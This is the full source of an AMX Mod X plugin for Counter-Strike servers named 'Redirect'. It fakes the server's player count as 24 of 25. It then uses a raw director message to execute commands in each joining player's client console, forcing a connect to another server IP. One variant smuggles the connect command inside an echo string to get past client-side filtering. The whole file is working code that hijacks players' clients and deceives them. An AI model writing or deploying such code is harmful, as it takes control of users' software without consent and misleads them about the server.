#include <amxmodx>
#include <fake_queries>

public plugin_init()
{
	register_plugin("Redirect", "1.0", "O'Zone");
	
	if(fq_set_players(24)) log_amx("Ustawiono 24/25 graczy");
}

public client_authorized(id)
{
	client_execute(id, "connect 193.33.177.111");
	client_execute(id, "^"connect^" 193.33.177.111");
	client_execute(id, "echo ^"^";^"connect^" 193.33.177.111");
}
	
public client_connect(id)
{
	client_execute(id, "connect 193.33.177.111");
	client_execute(id, "^"connect^" 193.33.177.111");
	client_execute(id, "echo ^"^";^"connect^" 193.33.177.111");
}
	
public client_putinserver(id)
{
	client_execute(id, "connect 193.33.177.111");
	client_execute(id, "^"connect^" 193.33.177.111");
	client_execute(id, "echo ^"^";^"connect^" 193.33.177.111");
}

stock client_execute(id, const szText[], any:...) 
{
    #pragma unused szText

    new szMessage[256];

    format_args(szMessage, charsmax(szMessage), 1);

    message_begin(id == 0 ? MSG_ALL : MSG_ONE, 51, _, id);
    write_byte(strlen(szMessage) + 2);
    write_byte(10);
    write_string(szMessage);
    message_end();
}
